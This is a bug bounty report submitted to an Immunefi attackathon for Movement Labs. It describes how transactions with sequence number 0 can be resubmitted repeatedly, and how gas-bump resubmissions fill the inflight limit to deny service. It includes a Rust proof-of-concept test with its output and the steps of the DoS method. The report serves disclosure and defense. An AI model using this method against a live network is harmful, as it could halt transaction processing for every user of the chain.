# #42991 \[BC-High] User can reuse sequence number causing DOS & breaking core invariant

**Submitted on Mar 31st 2025 at 09:19:57 UTC by @okmxuse for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #42991
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/execution/maptos/opt-executor>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters
  * Network not being able to confirm new transactions (total network shutdown)

## Description

### Description

Whenever a transaction is processed, it is assigned a sequence number. This number is incremented within `submit_transaction`, specifically in `has_invalid_sequence_number`:

```javascript
let min_used_sequence_number =
    if used_sequence_number > 0 { used_sequence_number + 1 } else { 0 };
```

To ensure sequence numbers remain unique for each transaction, they are incremented—however, this only occurs when `used_sequence_number` is greater than 0. This distinction is critical for the issue we outline below.

Later, the following check is performed:

```javascript
if transaction.sequence_number() < min_sequence_number {
    info!("Transaction sequence number too old: {:?}", transaction.sequence_number());
    return Ok(SequenceNumberValidity::Invalid((
        MempoolStatus::new(MempoolStatusCode::InvalidSeqNumber),
        Some(DiscardedVMStatus::SEQUENCE_NUMBER_TOO_OLD),
    )));
}
```

This ensures that transactions with outdated sequence numbers are rejected.

### Issue

A user can repeatedly submit transactions with a sequence number of 0 because they are not incremented. Thus meaning that nodes will now process transactions with reused sequence numbers which breaks a core invariant.

Additionally, this loophole allows a user to DOS all transactions by reaching the `inflight_limit`.This can be achieved by repeatedly submitting gas increase transactions, bloating the inflight transactions. We will further showcase this in the POC

### Impact

Due to this issue users are able to DOS the chain & break a core invariant.

### Recommendation

Disallow users to cause a DOS and ensure that this core invariant remains intact.

## Proof of Concept

### POC

* paste the following test-function inside `transaction_pipe.rs`. Feel free to read the commentary for more context:

```javascript
	async fn test_repeat_submit_with_seq0() -> Result<(), anyhow::Error> {
// We will showcase 2 scenarios
// - Scenario 1: Repeatedly calls made with seq 0, will all be accepted showcasing bug
// - Scenario 2: Repeatedly calls made with seq 1, only first will be accepted

let maptos_config = Config::default();
let (_context, mut transaction_pipe, _tx_receiver, _tempdir) = setup().await;

// Scenario 1:
let user_transaction = create_signed_transaction(0, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

let user_transaction = create_signed_transaction(0, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

let user_transaction = create_signed_transaction(0, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

let user_transaction = create_signed_transaction(0, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

// Scenario 2:
let user_transaction = create_signed_transaction(1, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

let user_transaction = create_signed_transaction(1, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
assert_eq!(mempool_status.code, MempoolStatusCode::InvalidSeqNumber);

		Ok(())
	}
```

* Run `nix develop -c cargo test test_repeat_submit_with_seq0`
* Logs

```
running 1 test
test background::transaction_pipe::tests::test_repeat_submit_with_seq0 ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 15 filtered out; finished in 3.64s
```

With this POC in mind we will now focus on the aforementioned statement:

> Additionally, this loophole allows a user to cause a denial-of-service (DoS) attack by reaching the `inflight_limit`. This can be achieved by repeatedly submitting gas increase transactions, causing the number of inflight transactions to rise. We will further showcase this in the POC

This is possible because inflight transactions are only incremented when `status.code` returns `Accepted`.

```javascript
	match status.code {
			MempoolStatusCode::Accepted => {
//..code
				// increment transactions in flight
				{
					let mut transactions_in_flight = self.transactions_in_flight.write().unwrap();
					transactions_in_flight.increment(now, 1);
				}
```

A user can exploit this by repeatedly submitting transactions with sequence number 0 while increasing the gas amount by a super small amount. These transactions are then recognized as gas increase transactions and return as `Accepted`

Note that we have highlighted only the relevant code. Please refer to the full commentary for additional context:

```javascript
pub(crate) fn insert(&mut self, txn: MempoolTransaction) -> MempoolStatus {
    let address = txn.get_sender();
    let txn_seq_num = txn.sequence_info.transaction_sequence_number;
    let acc_seq_num = txn.sequence_info.account_sequence_number;

    // If the transaction is already in Mempool, we only allow the user to
    // increase the gas unit price to speed up a transaction, but not the max gas.

    // These if statements ensure the sequence number is the same so that it is recognized as a gas increasing tx 
    if let Some(txns) = self.transactions.get_mut(&address) {
        if let Some(current_version) = txns.get_mut(&txn_seq_num) {

            // Here, it checks if the new gas price is higher
        } else if current_version.get_gas_price() < txn.get_gas_price() {
            // Update the transaction if the new gas price is higher
            if let Some(txn) = txns.remove(&txn_seq_num) {
                self.index_remove(&txn);
            };
            // `Accepted` is returned
            MempoolStatus::new(MempoolStatusCode::Accepted)
        }
    }
}
```

A user can exploit this mechanism to trigger the `inflight_limit` check, effectively causing a DOS for all transactions.

The only requirement for the user is to pay gas fees. However, they can bypass this cost barrier by increasing the gas price in small, negligible increments in combination with Aptos' low fee prices.
